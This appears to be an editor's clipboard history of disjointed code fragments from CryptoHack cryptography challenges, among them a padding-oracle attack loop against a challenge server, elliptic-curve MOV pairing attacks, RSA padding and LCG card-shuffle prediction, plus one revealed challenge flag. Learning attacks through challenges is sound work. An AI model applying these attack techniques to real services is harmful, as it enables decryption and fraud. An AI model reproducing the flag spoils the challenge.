	)
	
	state = [
	    [251, 64, 182, 81],
	    [146, 168, 33, 80],
	    [199, 159, 195, 24],
	    [64, 80, 182, 255],
	]
	
	
	def sub_bytes(s, sbox=s_box):
	    new_state = []
	    for line in s:
	        new_line = [inv_s_box[i] for i in line]
	        new_state.append(new_line)
	    return new_state
	
f2783c60928d03fb846b5feb26e29361|file:///home/neo/cryptohack/block-ciphers/aes/aes_decrypt.py|43|1|V|python
	state = [
	    [251, 64, 182, 81],
	    [146, 168, 33, 80],
	    [199, 159, 195, 24],
	    [64, 80, 182, 255],
	]
	
435d986e6522a5bb04daafa557d72307|file:///home/neo/cryptohack/block-ciphers/aes/aes_decrypt.py|170|1|V|python
	        inv_s_box()
415b53dba83e963ce0959ca2665d050a|file:///home/neo/cryptohack/block-ciphers/aes/aes_decrypt.py|170|1|V|python
	        state = sub_bytes(state, sbox=inv_s_box)
531639caa4cc1861408360fcd6b3a8a7|file:///home/neo/cryptohack/block-ciphers/aes/aes_decrypt.py|171|1|V|python
	        state = add_round_key(state, round_keys[i-1])
fc56c45cafa0acdfc59fa81950788446|file:///home/neo/cryptohack/block-ciphers/aes/aes_decrypt.py|175|1|V|python
	        inv_shift_rows(state)
	        state = sub_bytes(state, sbox=inv_s_box)
	        state = add_round_key(state, round_keys[0])
	
f8581b24acf79072cbf26e5235d0a1be|file:///home/neo/Documents/epl682/notes/authentication.md|32|1|V|markdown
	- One system doesn't
222d63fcb3b14be939d7203c6a476297|file:///home/neo/Documents/epl682/notes/authentication.md|41|1|V|markdown
	- Vouching services vouches for user login
19fe1d2efb85e259121ba6cf1af4d397|file:///home/neo/Documents/epl682/notes/authentication.md|44|75|v|markdown
	Service 
4d93da97e8f24d4480514b43b845be6d|file:///home/neo/Documents/epl682/notes/network-security.md|23|5|V|markdown
	    - Discover unadvertised services, ie tor services (good and bad)
41d3147a91b85310d83348f175b690ce|file:///home/neo/cryptohack/general/mathematics/broken_rsa.txt|5|18|v|text
	25896648132584848997586711135603893785415337101949225244631343481210405780811332119759307874059727010777167812035912372196575481842224645733061195132115112220159107703674501271473559970753594546204150685962550523843522413970644096008465829310813222999461562111843184013149599517813014050923809256205123632691855348385395308350697366794668591307747085387335341734086863787410869181572477318095841062013941906480427573647366672297300893346591531516627997796199042635223117454430097540639866770047391459705942440796647902108687843667674773561359583115940919066324629237139967028333486037894618590781065861597201909020864
862d42f49acbddd66d89736801252bff|file:///home/neo/cryptohack/general/mathematics/broken_rsa.txt|1|1|V|text
	n = 27772857409875257529415990911214211975844307184430241451899407838750503024323367895540981606586709985980003435082116995888017731426634845808624796292507989171497629109450825818587383112280639037484593490692935998202437639626747133650990603333094513531505209954273004473567193235535061942991750932725808679249964667090723480397916715320876867803719301313440005075056481203859010490836599717523664197112053206745235908610484907715210436413015546671034478367679465233737115549451849810421017181842615880836253875862101545582922437858358265964489786463923280312860843031914516061327752183283528015684588796400861331354873
b152b93645223eeacaee943386fe450d|file:///home/neo/cryptohack/general/mathematics/real_eisenstein.py|5|1|V|python
	FLAG = "crypto{???????????????}"
228a37c4a96d1cdc1659b9e2bf4b0000|file:///home/neo/cryptohack/general/mathematics/real_eisenstein.py|6|16|v|python
	???????????????
9a5ab6b0f53b4dcb3eaf54224b7a7ad8|file:///home/neo/cryptohack/general/mathematics/real_eisenstein.py|6|1|V|python
	FLAG = "crypto{3is3nst3in_p}"
dd3e33217c5eddebc6eb60bb27016959|file:///home/neo/cryptohack/general/mathematics/real_eisenstein.py|11|19|v|python
	Decimal(PRIMES[i]).sqrt()
4c535c63d9b34ac31db7a8c06383e1dd|file:///home/neo/cryptohack/rsa/padding/sol_bespoke.py|17|1|V|python
	def decode_base64(encoded):
	    return base64.b64decode(encoded)
	
	def decode_hex(encoded):
	    # return bytes.fromhex(encoded).decode('ascii')
	    return codecs.encode(codecs.decode(encoded, 'hex').decode('latin-1'), 'latin-1')
	
	def decode_rot13(encoded):
	    return encoded.decode('rot13') 
	
	def decode_bigint(encoded):
	    return number.long_to_bytes(int(encoded, 16)).decode('latin-1')
	
	def decode_utf8(encoded):
	    return ''.join([chr(x) for x in encoded])
	    
	
	encodings = {
	        'base64': decode_base64,
	        'hex': decode_hex,
	        'rot13': decode_rot13,
	        'bigint': decode_bigint,
	        'utf-8': decode_utf8
	        }
	for _ in range(100):
	    received = json_recv()
	    enc_type = received["type"]
	    enc_value = received["encoded"]
	    decr_function = encodings.get(enc_type)
	    decr_value = decr_function(enc_value)
	
	    to_send = {
	        "decoded": decr_value
	    }
	    json_send(to_send)
	json_recv()
6aeb01e9052ba930911ec8feaee040c9|file:///home/neo/cryptohack/rsa/padding/sol_bespoke.py|7|1|V|python
	r = remote('socket.cryptohack.org', 13386, level = 'debug')
d7706d12e847dea116815fbde4998f24|file:///home/neo/cryptohack/rsa/padding/sol_bespoke.py|8|43|v|python
	 level = 'debug'
5af9586de88f56151cf1b1eb61b80096|file:///home/neo/cryptohack/rsa/padding/sol_bespoke.py|22|1|V|python
	    print(rec)
525a6fd02513af0c61adb1880f6d1beb|file:///home/neo/cryptohack/rsa/padding/sol_bespoke.py|20|1|V|python
	    rec = r.recvline()
	    print(rec)
4054da06e85a88cc66039982d308114b|file:///home/neo/cryptohack/rsa/padding/sol_bespoke.py|19|1|V|python
	# for i in range(5):
104127d1f60ea8b062628bdd7b24234e|file:///home/neo/cryptohack/rsa/padding/sol_bespoke.py|21|1|V|python
	print(rec)
9c2f5b1a088e5998ef20ef895d19fbf6|file:///home/neo/cryptohack/rsa/padding/sol_bespoke.py|28|1|V|python
	print('a: ', a)
6031b2e9da169c1a1fa2162cd5862d6c|file:///home/neo/cryptohack/rsa/padding/sol_bespoke.py|3|1|V|python
	import base64
	import codecs
408f0a92866b6161c448b711a9802ba9|file:///home/neo/cryptohack/rsa/padding/sol_bespoke.py|32|1|V|python
	    print('Unpadded flag:', unpadded_flag)
c4f9268f6feed2c9b95815dd6bf22ddf|file:///home/neo/cryptohack/rsa/padding/sol_bespoke.py|31|5|V|python
	    # print('Unpadded flag:', unpadded_flag)
2cc6a1f6b8b55b60e8d1fb591ec14e6b|file:///home/neo/cryptohack/rsa/padding/sol_bespoke.py|30|5|V|python
	    unpadded_flag = (((encrypted_flag - b) % n) * inv_a) % n
391bd506b0ed50d397660533f151a62f|file:///home/neo/cryptohack/rsa/padding/sol_bespoke.py|29|5|V|python
	    inv_a = mod_inverse(a, n)
56c5197f6f35a7bddfbe0fdbfdb3b493|file:///home/neo/cryptohack/block-ciphers/ctr/stream_conciousness.py|1|1|V|python
	import requests, string
	from Crypto.Cipher import AES
	import sys, string, os, itertools
	sys.path.insert(1, '~/cryptohack')
	from general.xor.xor import *
cd9c8e76368e68b2803b0ec736a7071a|file:///home/neo/cryptohack/block-ciphers/ige/paper_plane.py|6|1|V|python
	from pwn import * # pip install pwntools
	import json
	import base64
	import codecs
	import string
	import Crypto.Util.number as number
6f8113d99bd2d94c43ceaa940489dc36|file:///home/neo/cryptohack/block-ciphers/ige/paper_plane.py|6|1|V|python
	# r = remote('socket.cryptohack.org', 13370, level = 'debug')
	r = remote('socket.cryptohack.org', 13370)
	
	def json_recv():
	    line = r.recvline()
	    return json.loads(line.decode())
	
	def json_send(hsh):
	    request = json.dumps(hsh).encode()
	    r.sendline(request)
	
5e5465e8b17948769c5d340daaa0bc94|file:///home/neo/cryptohack/block-ciphers/ctr/stream_conciousness.py|8|1|V|python
	URL_ENCRYPT = 'https://aes.cryptohack.org/stream_consciousness/encrypt/'
	
	if __name__=='__main__':
7b48c203bae6e69462652bbd598eedc1|file:///home/neo/cryptohack/block-ciphers/ige/paper_plane.py|7|43|v|python
	stream_consciousness
d23ed2db7e551fa8560692048587356e|file:///home/neo/cryptohack/block-ciphers/ige/paper_plane.py|7|1|V|python
	URL_MSG = 'https://aes.cryptohack.org/paper_plane/send_msg/'
edb8f3cebfacf28dd9cd56ad230854f5|file:///home/neo/cryptohack/block-ciphers/ige/paper_plane.py|7|11|v|python
	'https://aes.cryptohack.org/paper_plane/send_msg/'
9e1e5642bf43b5437333a1ade1f8f981|file:///home/neo/cryptohack/block-ciphers/ige/paper_plane.py|19|5|V|python
	    print('Ciphertext:', ciphertext)
8e98cc690bb1f47cf60f11473df5c9ae|file:///home/neo/cryptohack/block-ciphers/ige/paper_plane.py|23|13|v|python
	fake_first_block
ead14297e65614174fb7fa2bcd3c4b13|file:///home/neo/cryptohack/block-ciphers/ige/paper_plane.py|24|47|v|python
	ciphertext[:16]
fd8e2b2a0e64f0bd48e85bb37049b198|file:///home/neo/cryptohack/block-ciphers/ige/paper_plane.py|14|23|v|python
	bytes.fromhex(str(
fb84c31e4758ce35718d2e41d347504c|file:///home/neo/cryptohack/block-ciphers/ige/paper_plane.py|25|13|V|python
	            print(recv)
d989d76864740e07d3e0352bee3710c9|file:///home/neo/cryptohack/block-ciphers/ige/paper_plane.py|24|13|V|python
	            print(fake_c0)
37c280dd666500c27d6cd7ce286040eb|file:///home/neo/cryptohack/block-ciphers/ige/paper_plane.py|22|9|V|python
	        print(fake_c0)
7945fa54f81ace6549093fab93e722c7|file:///home/neo/cryptohack/block-ciphers/ige/paper_plane.py|29|52|v|python
	+ plaintext
e60fab0d5c2cb9a30913e9afd5032bd4|file:///home/neo/cryptohack/block-ciphers/ige/paper_plane.py|24|13|V|python
	            fake_c0[16 -i -1] += 1
e24b344df3b845f87a2e603d200e9434|file:///home/neo/cryptohack/block-ciphers/ige/paper_plane.py|24|13|V|python
	            fake_c0[16 -i -1] ^= pos ^ (pos-1)
0b6e29a9059331122c99fcc09dc1ef37|file:///home/neo/cryptohack/block-ciphers/ige/paper_plane.py|30|28|v|python
	cand_byte ^ first_block_prexor[16 - pos - 1]
6bbfe68ca8ded98389f76402460bd68d|file:///home/neo/cryptohack/block-ciphers/ige/paper_plane.py|33|43|v|python
	middl
b11dffdc1599cf544db6aa906287fe5f|file:///home/neo/cryptohack/block-ciphers/ige/paper_plane.py|25|35|v|python
	plaintext[16 - i - 1] ^ pos 
88df676c9890bac75a965ce1713ee014|file:///home/neo/cryptohack/block-ciphers/ige/paper_plane.py|27|9|V|python
	        print(middle_state)
d79ea5c84fab858cbe477c0a589463b6|file:///home/neo/cryptohack/block-ciphers/ige/paper_plane.py|26|13|V|python
	        # print(fake_c0)
	        # print(xor_bytes(bytes(middle_state), bytes(fake_c0)))
b13b299f543d5d6dfba640c1e60afc07|file:///home/neo/cryptohack/block-ciphers/ige/paper_plane.py|19|1|V|python
	    plaintext = bytearray(16)
	    middle_state = bytearray(16)
	    fake_c0 = bytearray(c0[:16])
	    for pos in range(16):
	        correct_pad_byte = pos + 1
	        for i in range(pos):
	            fake_c0[16 - i - 1] = middle_state[16 - i - 1] ^ correct_pad_byte
	        for cand_byte in range(256):
	            fake_c0[16 - pos - 1] = cand_byte
	            recv = requests.get(url=URL_MSG + first_block_ct.hex() + '/' + m0.hex() + '/' + fake_c0.hex()).json()
	            if 'msg' in recv:
	                dec_byte = correct_pad_byte ^ cand_byte
	                middle_state[16 - pos - 1] = dec_byte 
	                plaintext[16 - pos - 1] = dec_byte ^ c0[16 - pos - 1]
	                print(str(plaintext))
	                break
11ab0295c1383c8d2e40169d831891e8|file:///home/neo/cryptohack/block-ciphers/ige/paper_plane.py|17|17|V|python
	    first_block_prexor = xor_bytes(first_block_ct, m0)
	    second_block_prexor = xor_bytes(second_block_ct, first_block_ct)
bae5ab5322261f1a0a3bd586aa589436|file:///home/neo/cryptohack/block-ciphers/ige/paper_plane.py|35|25|v|python
	c0[:16]
925d7f506363e2a049e2c4858f056b3e|file:///home/neo/cryptohack/block-ciphers/ige/paper_plane.py|35|25|v|python
	first_block_ct
c458381c06b8b34ba28f627fd982306f|file:///home/neo/cryptohack/block-ciphers/ige/paper_plane.py|33|5|v|python
	prev_plaintet
d8bfa2b6af0a1b54dcb02e4ffaa69e3a|file:///home/neo/cryptohack/block-ciphers/ige/paper_plane.py|37|25|v|python
	xor_bytes(first_block_ct, bytes(m0))
fd655679a2f001de7633d8ea5293f4d7|file:///home/neo/Documents/thesis/background.tex|23|998|v|tex
	Calculating
d2c24d59e0baff4d0155fbdf62590867|file:///home/neo/Documents/thesis/architecture.tex|6|160|v|tex
	Section
980077a2ed6cba2a2164c82c09d82f6d|file:///home/neo/Documents/thesis/implementation.tex|45|1|v|tex
	Since we already knew how to add a new cryptographic hash function in the NSS
e727c5b7969a0924044ea82db6406337|file:///home/neo/Documents/thesis/evaluation.tex|13|27|v|tex
	generating
39f13f1f06f0ab5b4e05b00096edbbf6|file:///home/neo/Documents/thesis/architecture.tex|12|1|V|tex
	\section{Overview}
0d7ce031326c99e8a7a488ba5982a95a|file:///home/neo/cryptohack/rsa/padding/bespoke.py|32|1|V|python
	
	        elif your_input['option'] == 'get_flag':
	            pad_var, encrypted = self.encrypt(FLAG)
	            return {"encrypted_flag": encrypted[0], "modulus": encrypted[1], "padding": pad_var}
fd9815bea6d4378279382e37733abe80|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/moving.sage|33|1|V|python
	p = 1331169830894825846283645180581
	a = -35
	b = 98
	E = EllipticCurve(GF(p), [a,b])
	G = E.gens()[0]
06171417a7fd07cc4212f3dfb68d720a|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/mov_attack.sage|1|1|V|python
	F.<x> = GF(8111)[]
	K.<x> = GF(8111^3, name='x', modulus=x^3 + 4*x - 11)
	E  = EllipticCurve(GF(8111), [1,300])
	E_ = EllipticCurve(K, [1,300])
18afc87acee65ec0a7c97d2d13c54627|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/mov_attack.sage|10|1|V|python
	E = EllipticCurve(GF(p), [a,b])
e8212549f957036f2aec77692fa5656f|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/mov_attack.sage|11|1|V|python
	G = E.gens()[0]
890613000906868d237d7d619e1694a5|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/mov_attack.sage|7|1|V|python
	# F.<x> = GF(8111)[]
30410be149e6771f60881182342452d5|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/mov_attack.sage|8|12|v|python
	8111
c5bb94c2f08dc3e45c99331ea5fa547d|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/mov_attack.sage|9|1|V|python
	K.<x> = GF(8111^3, name='x', modulus=x^3 + 4*x - 11)
a0ac7722b6a6aeaafd3c364ce70e37b5|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/mov_attack.sage|13|1|V|python
	E_ = EllipticCurve(K, [1,300])
addf807abc79280008260fe73a5fa3fd|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/mov_attack.sage|14|24|v|python
	1,300
3a0f2012b563a2d3c36af66d79e497ef|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/output_moving.txt|2|19|v|text
	(1110072782478160369250829345256 : 800079550745409318906383650948 : 1)
3ec2071a4900ec75d15c4a998596f5f8|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/mov_attack.sage|19|1|V|python
	Q = ZZ.random_element(n) * P
0cff40a00a3dc3be50651f341a49eb34|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/mov_attack.sage|24|1|V|python
	p = 1331169830894825846283645180581
	a = -35
	b = 98
	
	# F.<x> = GF(8111)[]
	F.<x> = GF(p)[]
	# K.<x> = GF(8111^3, name='x', modulus=x^3 + 4*x - 11)
	K.<x> = GF(p^3, name='x', modulus=x^3 + a*x + b)
	# E  = EllipticCurve(GF(8111), [1,300])
	E = EllipticCurve(GF(p), [a,b])
	G = E.gens()[0]
	# E_ = EllipticCurve(K, [1,300])
	E_ = EllipticCurve(K, [a,b])
	
	n = E.order()
	# P = E.random_element()
	P = G
	# Q = ZZ.random_element(n) * P
	Q = E(1110072782478160369250829345256,800079550745409318906383650948)
	
	P_ = E_(P)
	Q_ = E_(Q)
	
	R = E_.random_element() * (E_.order() // E.order()^2)
	
	
	W1 = P_.weil_pairing(R, n)
	W2 = Q_.weil_pairing(R, n)
	u = log(W2, W1)
	
	assert(P*u == Q)
4589d99a87a36e1280df4b8984bbab5a|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/moving.sage|33|1|V|python
	p = 1331169830894825846283645180581
	a = -35
	b = 98
	E = EllipticCurve(GF(p), [a,b])
a1e0a3f5ec775190fe0314d045e93b10|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/output_moving.txt|1|12|v|text
	(479691812266187139164535778017 : 568535594075310466177352868412 : 1)
7b5961a77eed2e26197ee4ccd0f6a10f|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/output_moving.txt|1|13|v|text
	479691812266187139164535778017 
1d146cbaad63543b1c83fe15c66e4fff|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/mov_attack.sage|13|1|V|python
	# P = E(gx, gy)
5f75e642507bc6ce238a719bbd4c8c82|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/mov_attack.sage|15|69|V|python
	# nP = E(0x83c02e919804d3aa0aa98a3162a393884bb3f203, 0x11d46c5db96703a64609ddf2526b79bef026ceb7a)
	# R = E(0x1ddc663e98edb9e848b66dd961bb555396fa680, 0xdedc439c092188a093b2b887dcbee2abe302934c)
28f91533261e50754a348dec319c9c4e|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/output_moving.txt|3|17|v|text
	(1290982289093010194550717223760 : 762857612860564354370535420319 : 1)
9a6c8451529b252afdb5075422664c54|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/output_moving.txt|4|18|v|text
	'iv': 'eac58c26203c04f68d63dc2c58d79aca', 'encrypted_flag': 'bb9ecbd3662d0671fd222ccb07e27b5500f304e3621a6f8e9c815bc8e4e6ee6ebc718ce9ca115cb4e41acb90dbcabb0d'
17cd4045baeb2a2a625c39b3f42f61b6|file:///home/neo/cryptohack/elliptic-curves/starter/decrypt.py|41|39|V|python
	iv = "3b9837a25a30966dec3e02c7878e2658"
	ciphertext = "48d2bf5f2b1d8f391519dd35fc886c429182c9c280e4ededd7aec0a574cc202b4835284a3a5286f41b3f859e1cd05e4336dd1fc7173cf5a994544e0fb8296e57e7cdd7918effdf30067e4e6f0293dbaf"
897426766b043c0e5e98b77bff58ebce|file:///home/neo/cryptohack/elliptic-curves/starter/decrypt.py|42|1|v|python
	encrypted_flag':
17b3483a356c12a4194b4c5ef2c76d3e|file:///home/neo/cryptohack/elliptic-curves/starter/decrypt.py|42|1|v|python
	shared_secret
eac10642779152f8f88e5772642447b0|file:///home/neo/cryptohack/elliptic-curves/starter/decrypt.py|40|17|v|python
	2368889504635074522597970528436572299373704260900359161070645673228909603871160218047885963075951718224302629357301456415181622446216672904301810533655318521319005894668461834218646043083086096452033237662880207578210325069986680805064495859904055932198801097632510258523074960467055380357398025576981776461119744191354319558693354879381724156813202457600882047938007002665054664268227777640888389702547922083529068253931268965801147785394380114219370807016748988
e86785cf1a0fe8aeb8f71de6f7d4fced|file:///home/neo/cryptohack/elliptic-curves/starter/decrypt.py|40|17|v|python
	29618469991922269
67f8887a6968944eae2c7b11aa51a19a|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/mov2.sage|3|1|v|python
	x^2 - 2307526668010426*x + 1331169830894825846283645180581
d4ab93ce8929ccb45d5889cefbc37ecc|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/mov2.sage|2|98|v|python
	x^3 + 4*x - 11
a0fd0261358ac1911258c8ef40244cde|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/mov2.sage|14|6|v|python
	.random_element()
32f507dbc9dadf15682c3836270810bb|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/output_moving.txt|1|12|v|text
	(479y691812266187139164535778017 : 568535594075310466177352868412 : 1)
66dc25e5c036db054c3ae152319edc03|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/mov2.sage|14|75|v|python
	))(479y691812266187139164535778017 , 568535594075310466177352868412)
83fca26d1086d5dbc7a517dfa5e067a4|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/mov2.sage|15|5|v|python
	ZZ.random_element(n) * P
31809fea7e9d0835193f6a907017029c|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/mov_attack.sage|1|1|V|python
	# a = 1
	# b = 0
	# p = 3009944491747103173592552029257669572283120430367
	# order = 3009944491747103173592552029257669572283120430368
	# gx = 2900641855339024752663919275085178630626065454884
	# gy = 1803317565451817334919844936679231131166218238368
	# P = E(gx, gy)
	# nP = E(0x83c02e919804d3aa0aa98a3162a393884bb3f203, 0x11d46c5db96703a64609ddf2526b79bef026ceb7a)
	# R = E(0x1ddc663e98edb9e848b66dd961bb555396fa680, 0xdedc439c092188a093b2b887dcbee2abe302934c)
	
	p = 1331169830894825846283645180581
	a = -35
	b = 98
	E = EllipticCurve(GF(p), [a,b])
	
	P = E(479691812266187139164535778017 , 568535594075310466177352868412)
	nP = E(1110072782478160369250829345256 , 800079550745409318906383650948)
	R = E(1290982289093010194550717223760 , 762857612860564354370535420319)
	
	K.<u> = GF(p**2)
	EK = E.base_extend(K)
	nPK = EK(nP)
	PK = EK(P)
	QK = EK.lift_x(u + 1)
	nPKK = nPK.tate_pairing(QK, E.order(), 2)
	PP = PK.tate_pairing(QK, E.order(), 2)
	assert nPKK != 1 and PP != 1
	n = nPKK.log(PP)
	print(n)
000b905fc2f4e758c27b27f19aa4683e|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/moving.sage|33|1|V|python
	p = 1331169830894825846283645180581
	a = -35
	b = 98
6e06bdeb598bbbca9222783af07633e9|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/moving.sage|36|1|V|python
	E = EllipticCurve(GF(p), [a,b])
	G = E.gens()[0]
57513bdeed746e508eebe6300854c0bc|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/sol.sage|10|1|V|python
	order = 3009944491747103173592552029257669572283120430368
	gx = 2900641855339024752663919275085178630626065454884
	gy = 1803317565451817334919844936679231131166218238368
2fb7263c3b6ca7f5a451754b0b146865|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/sol.sage|23|1|V|python
	P = G
0c315255c6397fc3860bf80e503f3528|file:///home/neo/cryptohack/elliptic-curves/parameter-choice/sol.sage|24|6|v|python
	E(1290982289093010194550717223760, 762857612860564354370535420319)
38bbf5a1b978cca8adb6ceeff18739cd|file:///home/neo/cryptohack/elliptic-curves/starter/decrypt.py|40|1|V|python
	shared_secret = 29618469991922269
dae37282b54818c5820d5564b4fdfcdc|file:///home/neo/cryptohack/misc/prngs/lohi.py|142|1|V|python
	
	# listener.start_server(port=13383)
58ff86ff46657d720ce3e1ec382c0197|file:///home/neo/cryptohack/misc/prngs/lohi.py|11|1|V|python
	class RNG:
	    mul = random.getrandbits(60)
	    inc = random.getrandbits(60)
	    mod = 2**61 - 1  # 9th mersenne prime
	
	    def __init__(self, seed):
	        self.state = seed
	
	    def next(self):
	        self.state = (self.state * self.mul + self.inc) % self.mod
	        return self.state
91dc8ec12b9d9e9966a3d46d7496bd3f|file:///home/neo/cryptohack/misc/prngs/lohi.py|1|1|V|python
	from functools import total_ordering
	from Crypto.Random import random
	from utils import listener
5d9ba5bbab25f083ec66dbb2f57f1498|file:///home/neo/cryptohack/misc/prngs/lohi.py|42|14|v|python
	rng = RNG(random.getrandbits(60))
e5203beef61bd36d9e8b728220a44ed9|file:///home/neo/cryptohack/misc/prngs/lohi.py|42|1|V|python
	        self.rng = RNG(random.getrandbits(60))
fd5d00b83a8a370e645d9bba7274d242|file:///home/neo/cryptohack/misc/prngs/lohi.py|1|1|V|python
	from functools import total_ordering
	from Crypto.Random import random
b1d3a6e0460c2fec53ef4e6e0373a090|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|64|1|V|python
	        print(next_shuffle)
	        print(rand_num)
ca5f843a9ffe5cfd462201c8747b8a30|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|65|9|V|python
	        print(card_arr)
	        print([x % 12 for x in card_arr])
efbfd4d664d93293b30213bc39712e34|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|74|40|^v|python
	(rand_num * mul + inc) % mod)
e7418ccc417fc274a9f293c748f0a9b1|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|74|13|V|python
	            print('Next random num: ', next_rand_num)
00f1793e86e4d3989bd96e77e6c69caf|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|75|37|V|python
	            mul, inc = get_mul_inc(random_nums[0], random_nums[1], random_nums[2], mod) 
	            next_rand_num = (rand_num * mul + inc) % mod
52d85f6c55eeb694d7c22f05c912f392|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|75|1|V|python
	            next_rand_num = (rand_num * mul + inc) % mod
	            next_deal = rebase(next_rand_num)
cffd91a347643a5627ba767b4453d087|file:///home/neo/cryptohack/misc/prngs/lohi.py|24|1|V|python
	@total_ordering
	class Card:
	    def __init__(self, value, suit):
	        self.value = value
	        self.suit = suit
	
	    def __str__(self):
	        return f"{self.value} of {self.suit}"
	
	    def __eq__(self, other):
	        return self.value == other.value
	
	    def __gt__(self, other):
	        return VALUES.index(self.value) > VALUES.index(other.value)
8ae98fe81bfd502f87bd0224f223e31e|file:///home/neo/cryptohack/misc/prngs/lohi.py|1|1|V|python
	from functools import total_ordering
08729edd468f599cafbc8aa8934a9f99|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|60|1|V|python
	custom_deck = [CustomCard(value, suit) for suit in SUITS for value in VALUES]
9491717d128a4dcf7eb63c5ec61d9e87|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|61|1|v|python
	custom_deck
fad88794fbd8a9d5b44352f324478109|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|76|1|V|python
	    json_send({"choice":"l"})
b600b8363a353b60c914e115a6e2dc56|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|102|1|V|python
	                    json_send({"choice":"l"})
5b4725c3342bff26aabaabd241418131|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|78|1|V|python
	    rec = json_recv()
27593af65d304681e2073bbee75dec0f|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|92|1|V|python
	        print('Random num:', rand_num)
a4a59ce5f95dbdd1f1fd61cb48f23273|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|94|9|V|python
	        # print(rand_num)
6b0203e3dc30ffdc08bedd97960ae43e|file:///home/neo/cryptohack/misc/prngs/lohi.py|11|1|V|python
	class RNG:
	    mul = random.getrandbits(60)
	    inc = random.getrandbits(60)
	    mod = 2**61 - 1  # 9th mersenne prime
	
	    def __init__(self, seed):
	        self.state = seed
	
	    def next(self):
	        self.state = (self.state * self.mul + self.inc) % self.mod
	        return self.state
	
1f73e7b03c604a4dcb0cb57e90c488ff|file:///home/neo/cryptohack/misc/prngs/lohi.py|24|1|V|python
	@total_ordering
	class Card:
	    def __init__(self, value, suit):
	        self.value = value
	        self.suit = suit
	
	    def __str__(self):
	        return f"{self.value} of {self.suit}"
	
	    def __eq__(self, other):
	        return self.value == other.value
	
	    def __gt__(self, other):
	        return VALUES.index(self.value) > VALUES.index(other.value)
	
7e9d8ff78af510cf0552f7728a96b538|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|83|5|V|python
	    print(custom_deck.index(han))
5e756a5740e3b62d2d2777e2acb4d6b6|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|128|1|V|python
	        rand_num = 0 
749919601267714264bc5af1f8d1362f|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|70|1|V|python
	msg = msg.split()
b4009727021dd1c42333cb22581ebcc3|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|84|21|v|python
	.split()
6f84eee883cbc3e62feb045ae54215a9|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|97|1|V|python
	    rand_num += card * (52 ** next_shuffle)
01c02dd544c2d4d2c4642c291f9220ef|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|90|1|V|python
	    value = hand[0]
	    suit = hand[2]
c5d3176eaa3060ea73adc15aec4193cc|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|96|1|V|python
	    card = custom_deck.index(CustomCard(value, suit))
87455fa7a5799ad501719e4e074b8fbf|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|76|1|V|python
	card = custom_deck.index(CustomCard(value, suit))
09ebe2ccf742b4b9a98387cf1f7f2b31|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|71|1|V|python
	print(value,suit)
7911ff6bc2b1fa8c1d0369e31bffc90e|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|100|1|V|python
	    print(f"{card} * (52 ** {next_shuffle})")
d6afd7a1b92a9ecc2a8273f18f1a85be|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|71|1|V|python
	print(f"{card} * (52 ** {next_shuffle})")
ff93b336637fbcb6862e8f5e51f89b4d|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|78|1|V|python
	next_shuffle -= 1
4750cc2c1e7fbbf6c9b68f4b521bec6a|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|85|1|V|python
	    total_rounds += 1
b7272a4909df1e3994d0a36981130aff|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|138|17|V|python
	                print(total_rounds)
cdf39fcff2e335aa54b7c17f75ca0292|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|138|32|V|python
	                if total_rounds == 100:
	                    print(rec)
8335239e2ab799ef09c33177dc00bbd4|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|123|21|V|python
	                    print(json_recv())
4e6d367a2b8b7bedf9d898b8a451741a|file:///home/neo/cryptohack/misc/prngs/sol_lohi.py|122|17|V|python
	                if total_rounds == 99:
